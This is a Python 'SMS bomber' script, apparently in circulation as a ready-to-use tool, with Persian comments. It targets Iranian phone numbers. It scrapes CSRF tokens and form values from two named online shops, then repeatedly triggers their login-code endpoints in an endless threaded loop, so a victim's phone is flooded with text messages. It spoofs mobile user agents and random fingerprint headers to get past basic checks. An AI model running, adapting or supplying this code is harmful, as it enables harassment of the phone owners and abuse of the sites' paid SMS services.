from platform import node, system, release
from os import system as os_system, name
from re import match, sub
from threading import Thread
import urllib3
from time import sleep
import random
import socket

# ------------------------------
# Imports & Setup
# ------------------------------
urllib3.disable_warnings()

try:
    from requests import get, post
except ImportError:
    os_system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'
g = '\033[32;1m'
y = '\033[33;1m'
b = '\033[34;1m'
p = '\033[35;1m'
w = '\033[37;1m'
a = '\033[0m'
d = '\033[90;1m'

# System info
Node, System, Release = node(), system(), release()

# ------------------------------
# Helpers
# ------------------------------
def clear_screen():
    os_system('clear' if name == 'posix' else 'cls')

def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# SMS Service
# ------------------------------

def ilozi(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    
    try:
        # ایجاد session برای حفظ cookies
        session = requests.Session()
        
        # دریافت صفحه اصلی برای استخراج مقادیر
        home_response = session.get("https://ilozi.com/?login=true&page=2", timeout=10, headers={
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        })
        
        # استخراج instance_id از صفحه
        instance_id = None
        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
        match = re.search(instance_pattern, home_response.text)
        if match:
            instance_id = match.group(1)
        
        # استخراج digits_form از صفحه
        digits_form = None
        form_pattern = r'name="digits_form" value="([a-f0-9]+)"'
        match = re.search(form_pattern, home_response.text)
        if match:
            digits_form = match.group(1)
        
        # اگر پیدا نشد، از مقادیر پیشفرض استفاده کن
        if not instance_id:
            instance_id = "6fb17492e0d343df4e533a9deb8ba6b9"
        if not digits_form:
            digits_form = "3780032f76"
        
        url = "https://ilozi.com/wp-admin/admin-ajax.php"
        
        payload = {
            "login_digt_countrycode": "+98",
            "digits_phone": digits_phone,
            "action_type": "phone",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "digits": "1",
            "instance_id": instance_id,
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
            "digits_form": digits_form,
            "_wp_http_referer": "/?login=true&page=2",
            "show_force_title": "1",
            "otp_resend": "true",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://ilozi.com",
            "Referer": "https://ilozi.com/?login=true&page=2",
        }
        
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                if response_data.get("success") is True:
                    print(f'{g}(ilozi) {a}Code Sent')
                    return True
                else:
                    print(f'{r}[-] (ilozi) Failed: {response_data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if response.text.strip() == "1":
                    print(f'{g}(ilozi) {a}Code Sent')
                    return True
        
        print(f'{r}[-] (ilozi) HTTP Error: {response.status_code}{a}')
        return False
            
    except Exception as e:
        print(f'{r}[!] ilozi Exception: {e}{a}')
        return False



def vitrin_shop(phone):
    import requests
    import re
    import uuid
    
    formatted_phone = "0" + phone.replace("+98", "")
    
    # تابع برای دریافت توکن تازه
    def get_fresh_token():
        try:
            session = requests.Session()
            # دریافت صفحه اصلی برای توکن تازه
            home_response = session.get("https://www.vitrin.shop/", timeout=10, headers={
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
            })
            
            # استخراج توکن از cookies
            if 'XSRF-TOKEN' in session.cookies:
                return session.cookies['XSRF-TOKEN']
            
            # استخراج توکن از HTML (اگر در صفحه وجود دارد)
            token_patterns = [
                r'name="_token" content="([^"]+)"',
                r'name="csrf-token" content="([^"]+)"',
                r'XSRF-TOKEN=([^;]+)',
            ]
            
            for pattern in token_patterns:
                match = re.search(pattern, home_response.text)
                if match:
                    return match.group(1)
                    
            return None
        except:
            return None
    
    try:
        # دریافت توکن تازه
        fresh_token = get_fresh_token()
        
        url = "https://www.vitrin.shop/api/v1/user/request_code"
        
        payload = {
            "phone_number": formatted_phone,
            "forgot_password": False
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "V-Session-ID": str(uuid.uuid4()),
            "V-Fingerprint-ID": str(uuid.uuid4()),
            "X-XSRF-TOKEN": fresh_token if fresh_token else "توکن-پیشفرض-اینجا",
            "Origin": "https://www.vitrin.shop",
            "Referer": "https://www.vitrin.shop/",
        }
        
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(vitrin_shop) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (vitrin_shop) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] vitrin_shop Exception: {e}{a}')
        return False
        

# ------------------------------
# SMS Bomber
# ------------------------------
# ------------------------------
# Safe service execution
# ------------------------------
def send_service_safe(service, phone):
    try:
        service(phone)
    except Exception as e:
        print(f"{r}[!] {service.__name__} Exception: {e}{a}")
        
def Vip(phone, Time):
    services = [
    vitrin_shop,   ilozi, # سرویس جدید
]
    total_services = len(services)

    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)

    try:
        while True:
            for service in services:
                Thread(target=send_service_safe, args=(service, phone)).start()
                sleep(Time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Completed!")
        clear_screen()

# ------------------------------
# Phone validation
# ------------------------------
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# ------------------------------
# Menu
# ------------------------------
def main_menu():
    clear_screen()
    print_slow(f"""
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
{p}╚════════════════════════════════════════════════════╝
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    return input(f"{g}[?] {y}Enter Choice (0-2): {a}")

# ------------------------------
# Main Loop
# ------------------------------
def main():
    while True:
        choice = main_menu()
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Email Bomber is not implemented yet.")

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break

        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)

# ------------------------------
# Entry Point
# ------------------------------
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection detected!{a}")
    else:
        main()
